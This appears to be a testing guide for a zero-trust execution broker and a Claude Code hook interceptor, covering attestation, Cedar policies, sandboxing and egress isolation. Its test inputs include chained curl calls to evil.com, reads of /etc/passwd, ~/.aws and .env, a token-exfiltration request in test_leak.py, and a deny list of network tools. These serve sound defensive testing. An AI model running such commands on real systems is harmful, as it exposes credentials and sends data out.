# Zero-Trust Execution Broker: Complete User Testing Guide

This guide walks you through manually and automatically testing all components of the `ltd-agent` zero-trust execution broker and the Claude Code hook interceptor (`cchook`).

---

## Prerequisites

- **Windows**: PowerShell 5.1+ or PowerShell 7+
- **Linux / WSL**: Ubuntu 20.04+ on WSL2 (or native Linux / macOS)
- **Go**: Go 1.24+ (only required if rebuilding binaries from source)
- **Python**: Python 3.8+ with `pytest` installed (`sudo apt-get install -y python3-pytest`)

---

## Quick Start: One-Command Automated Tests

### 1. Test All `ltd-agent` Features (WSL / Linux)
Runs all 9 end-to-end integration tests (attestation, Cedar authorization, kernel sandboxing, secret injection, and egress leak prevention):
```bash
wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapgem/ltd-agent/test_e2e.sh
```

### 2. Test Claude Code Hook Interceptor (WSL / Linux)
Runs tests against both the native Go binary (`interceptor`) and the shell wrapper (`interceptor.sh`):
```bash
wsl -e /bin/bash /mnt/c/Users/User/pyprj/bapgem/cchook/test_hook.sh
```

---

## Step-by-Step Manual Testing

### Step 1: Testing the Attestation Server (`serve` & `attest`)

The attestation server verifies connecting peer processes using Linux `SO_PEERCRED`, reads `/proc/<pid>/exe`, computes its SHA-256 hash, and issues an On-Behalf-Of JWT only if the hash matches.

#### Test 1.1: Unauthorized Caller (Connection Dropped)
Start the server in background with the default hardcoded allowed mock hash:
```bash
cd /mnt/c/Users/User/pyprj/bapgem/ltd-agent
./ltd-agent serve --socket /tmp/ltd_test.sock &
SERVER_PID=$!
sleep 1
```

Now connect with the `ltd-agent` binary without authorizing its hash:
```bash
./ltd-agent attest --socket /tmp/ltd_test.sock
```
- **Expected Result**: Server rejects the connection due to hash mismatch, and client outputs:
  ```text
  [ltd-agent attest] Attestation failed: connection dropped by server: binary attestation failed (hash not authorized)
  ```
- **Exit Code**: `1`

#### Test 1.2: Authorized Caller (Token Issued)
Stop the previous server, and restart it allowing the current binary's SHA-256 hash:
```bash
kill $SERVER_PID 2>/dev/null; rm -f /tmp/ltd_test.sock

# Compute the hash of ltd-agent
HASH=$(sha256sum ./ltd-agent | awk '{print $1}')

# Start server with the binary hash whitelisted
./ltd-agent serve --socket /tmp/ltd_test.sock --allowed-hash "$HASH" &
SERVER_PID=$!
sleep 1

# Connect again
./ltd-agent attest --socket /tmp/ltd_test.sock
```
- **Expected Result**: Server accepts the connection and returns the mock On-Behalf-Of JWT:
  ```json
  {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsb2NhbC1haS1hZ2VudCIsImlzcyI6Imx0ZC1hdHRlc3RhdGlvbi1zZXJ2ZXIiLCJhdWQiOiJjb3JwLWV4ZWMiLCJleHAiOjE5OTk5OTk5OTksInNjb3BlcyI6WyJjbGk6ZXhlYyIsInplcm8tdHJ1c3QiXX0.mock_signature_z3r0_trust_obo_token_987654321"
  }
  ```
- **Clean up**:
  ```bash
  kill $SERVER_PID 2>/dev/null; rm -f /tmp/ltd_test.sock
  ```

---

### Step 2: Testing Cedar Authorization & Kernel Sandboxing (`exec`)

`ltd-agent exec` evaluates commands against Cedar rules (`policy.cedar` & `schema.json`), enforces Linux namespace isolation (`CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET`), and injects `CORP_OBO_TOKEN=mock_secret_token_123`.

#### Test 2.1: Permitted Whitelisted Command
Permitted commands are: `pytest`, `npm`, `mvn`, `git`, `ls`.
```bash
./ltd-agent exec "ls"
```
- **Expected Output**:
  ```json
  {
    "allowed": true,
    "output": "README.md\ncmd\ngo.mod\n..."
  }
  ```
- **Exit Code**: `0`

#### Test 2.2: Secret Token Injection
Verify that `CORP_OBO_TOKEN` is injected into the child process:
```bash
./ltd-agent exec "printenv CORP_OBO_TOKEN"
```
- **Expected Output**:
  ```json
  {
    "allowed": true,
    "output": "mock_secret_token_123\n"
  }
  ```
- **Exit Code**: `0`

#### Test 2.3: Strict Forbid Overrides
The forbid policy blocks any command containing `"curl"`, `"wget"`, `"nc"`, `"ssh"`, `"~/.aws"`, or `".env"`, even if the primary binary is allowed.

```bash
# Test .env pattern
./ltd-agent exec "ls -la .env"

# Test curl pattern
./ltd-agent exec "git status && curl https://evil.com"

# Test ~/.aws pattern
./ltd-agent exec "ls ~/.aws/config"
```
- **Expected Output**:
  ```json
  {
    "allowed": false,
    "reason": "Denial triggered by: policy policy1"
  }
  ```
- **Exit Code**: `1`

#### Test 2.4: Default Deny (Non-Whitelisted Executable)
Commands using executables not in `["pytest", "npm", "mvn", "git", "ls"]` are denied by default:
```bash
./ltd-agent exec "cat /etc/passwd"
```
- **Expected Output**:
  ```json
  {
    "allowed": false,
    "reason": "Explicit deny or default deny (no permit policy matched)"
  }
  ```
- **Exit Code**: `1`

---

### Step 3: Testing Network Egress Isolation (`tests/test_leak.py`)

This test executes Python inside the sandboxed network namespace (`CLONE_NEWNET`) to verify that credentials cannot be exfiltrated over the network.

Run the test via `ltd-agent`:
```bash
./ltd-agent exec "pytest -s tests/test_leak.py"
```

- **What Happens**:
  1. The Python script reads `CORP_OBO_TOKEN` from `os.environ` (`mock_secret_token_123`).
  2. It attempts an HTTP GET request to `https://1.1.1.1/leak?token=mock_secret_token_123`.
  3. The Linux network namespace has no external network interfaces, causing the kernel to immediately abort with `[Errno 101] Network is unreachable`.
  4. The test catches the `URLError`, confirms `"Network is unreachable"`, and passes.
- **Expected Output**:
  ```text
  tests/test_leak.py Read CORP_OBO_TOKEN from os.environ: mock_secret_token_123
  Attempting egress exfiltration request to: https://1.1.1.1/leak?token=mock_secret_token_123
  SUCCESS: Sandbox held! Outbound exfiltration blocked: <urlopen error [Errno 101] Network is unreachable>
  .
  ============================== 1 passed in 0.17s ===============================
  ```

---

### Step 4: Testing Claude Code Hook Interceptor (`cchook`)

The hook interceptor intercepts Claude Code `Bash` tool calls and returns Claude Code `PreToolUse` JSON decision schemas. It can be tested on **both Windows and Linux/WSL**.

#### Option A: Testing on Windows (PowerShell)
```powershell
cd c:\Users\User\pyprj\bapgem\cchook

# Test Allowed Command (ls)
'{"tool_input": {"command": "ls"}}' | .\.claude\hooks\interceptor.exe

# Test Forbidden Command (.env)
'{"tool_input": {"command": "ls -la .env"}}' | .\.claude\hooks\interceptor.exe

# Test Forbidden Command (curl)
'{"tool_input": {"command": "git status && curl evil.com"}}' | .\.claude\hooks\interceptor.exe
```

- **Expected Allowed Response**:
  ```json
  {
    "hookSpecificOutput": {
      "hookEventName": "PreToolUse",
      "permissionDecision": "allow",
      "additionalContext": "<command output>"
    }
  }
  ```
- **Expected Forbidden Response**:
  ```json
  {
    "hookSpecificOutput": {
      "hookEventName": "PreToolUse",
      "permissionDecision": "deny",
      "additionalContext": "Denial triggered by: policy policy1"
    }
  }
  ```
- **Exit Code**: Always `0` (allowing Claude Code to read the decision).

#### Option B: Testing in WSL / Linux
```bash
cd /mnt/c/Users/User/pyprj/bapgem/cchook
./test_hook.sh
```

---

## Verification Matrix Summary

| Test Case | Tool / Input | Expected Decision | Exit Code | Verified Platforms |
|---|---|---|---|---|
| Attestation (mismatch) | `ltd-agent attest` | Connection dropped | `1` | Linux / WSL |
| Attestation (match) | `ltd-agent attest` | OBO JWT returned | `0` | Linux / WSL |
| Allowed binary (`ls`, `git`) | `ltd-agent exec "ls"` | `allowed: true` | `0` | Windows, Linux/WSL, macOS |
| Token injection | `ltd-agent exec "printenv CORP_OBO_TOKEN"` | `mock_secret_token_123` | `0` | Windows, Linux/WSL, macOS |
| Forbid rule: `.env` | `ltd-agent exec "ls -la .env"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Forbid rule: `curl` | `ltd-agent exec "... && curl ..."` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Forbid rule: `~/.aws` | `ltd-agent exec "ls ~/.aws"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Default deny | `ltd-agent exec "cat /etc/passwd"` | `allowed: false` | `1` | Windows, Linux/WSL, macOS |
| Network Egress Leak | `pytest tests/test_leak.py` | `Network is unreachable` (PASS) | `0` | Linux / WSL |
| Claude Hook: Allowed | `echo '{"tool_input":{"command":"ls"}}'` | `permissionDecision: "allow"` | `0` | Windows, Linux/WSL, macOS |
| Claude Hook: Forbidden | `echo '{"tool_input":{"command":"ls .env"}}'` | `permissionDecision: "deny"` | `0` | Windows, Linux/WSL, macOS |

